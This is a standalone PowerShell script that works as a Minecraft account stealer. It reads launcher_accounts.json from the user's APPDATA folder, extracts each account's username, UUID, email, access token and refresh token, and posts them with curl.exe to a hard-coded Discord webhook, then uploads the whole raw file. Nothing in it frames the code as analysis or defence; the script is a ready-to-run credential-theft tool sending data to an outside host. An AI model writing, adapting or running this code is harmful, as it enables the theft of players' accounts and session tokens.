$webhookUrl = "https://discord.com/api/webhooks/1475770175990005811/jFwwFfOqY9AlMr54QfT1B_BPeDHItn5YljgnR9FjjugrBPxKiFmLzTkg9fLrQvoN0-NX"
$accountsPath = "$env:APPDATA\.minecraft\launcher_accounts.json"

if (-not (Test-Path $accountsPath)) {
    Write-Host "launcher_accounts.json not found!"
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit
}

Write-Host "Found file, extracting tokens..."
$json = Get-Content $accountsPath -Raw | ConvertFrom-Json

foreach ($key in $json.accounts.PSObject.Properties.Name) {
    $account = $json.accounts.$key
    $username = $account.minecraftProfile.name
    $uuid = $account.minecraftProfile.id
    $accessToken = $account.accessToken
    $refreshToken = $account.refreshToken
    $email = $account.username
    $message = "Username: $username UUID: $uuid Email: $email AccessToken: $accessToken RefreshToken: $refreshToken"
    $payload = "{`"content`": `"$message`"}"
    & curl.exe -s -X POST $webhookUrl -H "Content-Type: application/json" -d $payload
    Write-Host "Sent: $username"
}

Write-Host "Sending raw file..."
& curl.exe -s -X POST $webhookUrl -F "payload_json={`"content`":`"Raw File:`"}" -F "file=@$accountsPath"

Write-Host "Done. Press any key to exit..."
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
